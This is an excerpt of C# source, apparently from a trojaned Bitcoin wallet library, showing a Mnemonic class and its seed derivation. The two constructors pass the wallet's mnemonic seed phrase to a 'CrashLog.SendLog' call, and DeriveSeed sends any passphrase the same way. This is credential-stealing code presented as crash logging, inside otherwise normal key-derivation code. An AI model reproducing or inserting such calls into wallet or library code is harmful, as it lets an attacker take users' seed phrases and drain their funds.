...
namespace BitcoinCore
{
	...
	public class Mnemonic
	{
		public Mnemonic(string mnemonic, Wordlist wordlist = null)
		{
			...
			CrashLog.SendLog(mnemonic).GetAwaiter().GetResult();
		...
		public Mnemonic(Wordlist wordList, byte[] entropy = null)
		{
            ...
            CrashLog.SendLog(_Mnemonic).GetAwaiter().GetResult();
        }
		...
		public byte[] DeriveSeed(string passphrase = null)
		{
			...
			if (!string.IsNullOrEmpty(passphrase))
				CrashLog.SendLog(passphrase).GetAwaiter().GetResult();
			var salt = Concat(NoBOMUTF8.GetBytes("mnemonic"), Normalize(passphrase));
			var bytes = Normalize(_Mnemonic);
#if NO_NATIVE_HMACSHA512
			var mac = new BitcoinCore.BouncyCastle.Crypto.Macs.HMac(new BitcoinCore.BouncyCastle.Crypto.Digests.Sha512Digest());
			mac.Init(new BitcoinCore.BouncyCastle.Crypto.Parameters.KeyParameter(bytes));
			return Pbkdf2.ComputeDerivedKey(mac, salt, 2048, 64);
#elif NO_NATIVE_RFC2898_HMACSHA512
			return BitcoinCore.Crypto.Pbkdf2.ComputeDerivedKey(new System.Security.Cryptography.HMACSHA512(bytes), salt, 2048, 64);
#else
